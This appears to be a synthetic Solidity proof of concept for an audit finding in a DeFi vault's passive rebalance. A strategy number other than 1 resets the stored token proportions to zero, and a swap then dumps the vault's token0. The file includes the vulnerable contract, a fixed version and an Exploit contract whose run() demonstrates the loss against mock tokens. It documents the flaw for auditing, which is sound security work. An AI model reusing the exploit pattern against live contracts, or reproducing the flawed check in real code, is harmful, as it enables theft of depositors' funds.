// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Aarna AFiBase.applySwapsAndPassiveRebal — strategy other than 1
    returns a zeroed proportion array (Zokyo, January 2024).

    SYNTHETIC, cheatcode-free. Proportions start at 6000 / 4000. Strategy 2
    still calls applyRebalForProportions. The array is allocated empty and
    returned, and the vault stores it. The next swap targets 0 of token0 and
    dumps 1000. Keeping 6000 bps would hold 1200. Off by 1200.

    rebalPeriod is 0, so the time check is true at the current timestamp.
    run() does not warp. */

contract Token {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Manager {
    function updateUTokenProportion() external pure returns (uint256[] memory proportions) {
        proportions = new uint256[](2);
        proportions[0] = 8000;
        proportions[1] = 2000;
    }
}

contract Rebal {
    Manager public manager;

    constructor(Manager manager_) {
        manager = manager_;
    }

    function applyRebalForProportions(uint256 _strategyNumber) external view returns (uint256[] memory uTokenProportions) {
        uTokenProportions = new uint256[](2);
        if (_strategyNumber == 1) {
            uTokenProportions = manager.updateUTokenProportion();
        }
        return uTokenProportions;
    }
}

contract AFiBase {
    uint256 public constant BPS = 10000;
    uint256 public typeOfProduct = 2;
    bool public isPassiveRebalEnabled = true;
    uint256 public lastRebalTime;
    uint256 public rebalPeriod;
    uint256 public strategy;
    uint256[] public uTokenProportions;
    Token public token0;
    Token public token1;
    Rebal public rebalContract;
    uint256 public sold0;

    constructor(Token token0_, Token token1_, Rebal rebal_) {
        token0 = token0_;
        token1 = token1_;
        rebalContract = rebal_;
        uTokenProportions.push(6000);
        uTokenProportions.push(4000);
        strategy = 2;
    }

    function proportion0() external view returns (uint256) {
        return uTokenProportions[0];
    }

    function applySwapsAndPassiveRebal() external virtual returns (uint256) {
        if (
            typeOfProduct == 2 && isPassiveRebalEnabled && (block.timestamp - lastRebalTime >= rebalPeriod)
                && strategy >= 1
        ) {
            // @> VULN: strategy other than 1 returns a zero array and replaces the stored proportions
            uTokenProportions = rebalContract.applyRebalForProportions(strategy);
        }
        return uTokenProportions[0];
    }

    function swapToward(address counterparty) external returns (uint256 sold) {
        uint256 bal0 = token0.balanceOf(address(this));
        uint256 bal1 = token1.balanceOf(address(this));
        uint256 total = bal0 + bal1;
        uint256 want0 = total * uTokenProportions[0] / BPS;
        if (bal0 > want0) {
            sold = bal0 - want0;
            token0.transfer(counterparty, sold);
            token1.transferFrom(counterparty, address(this), sold);
        } else {
            uint256 buy = want0 - bal0;
            token1.transfer(counterparty, buy);
            token0.transferFrom(counterparty, address(this), buy);
        }
        sold0 = sold;
    }
}

contract AFiBaseFixed is AFiBase {
    constructor(Token token0_, Token token1_, Rebal rebal_) AFiBase(token0_, token1_, rebal_) {}

    function applySwapsAndPassiveRebal() external override returns (uint256) {
        if (
            typeOfProduct == 2 && isPassiveRebalEnabled && (block.timestamp - lastRebalTime >= rebalPeriod)
                && strategy == 1
        ) {
            uTokenProportions = rebalContract.applyRebalForProportions(strategy);
        }
        return uTokenProportions[0];
    }
}

contract Exploit {
    uint256 public constant DUMPED = 1000 ether;
    uint256 public constant FAIR_HOLD = 1200 ether;
    uint256 public constant OFF = 1200 ether;

    Token public token0;
    Token public token1;
    Manager public manager;
    Rebal public rebal;
    AFiBase public vault;
    uint256 public received0;
    uint256 public proportion0;

    constructor() {
        token0 = new Token();
        token1 = new Token();
        manager = new Manager();
        rebal = new Rebal(manager);
        vault = new AFiBase(token0, token1, rebal);
        token0.mint(address(vault), 1000 ether);
        token1.mint(address(vault), 1000 ether);
        token1.mint(address(this), 1000 ether);
    }

    function run() external {
        token1.approve(address(vault), DUMPED);
        proportion0 = vault.applySwapsAndPassiveRebal();
        uint256 sold = vault.swapToward(address(this));
        received0 = token0.balanceOf(address(this));
        require(proportion0 == 0, "not reset");
        require(sold == DUMPED, "sold");
        require(received0 == DUMPED, "received");
        require(FAIR_HOLD - token0.balanceOf(address(vault)) == OFF, "off");
    }
}
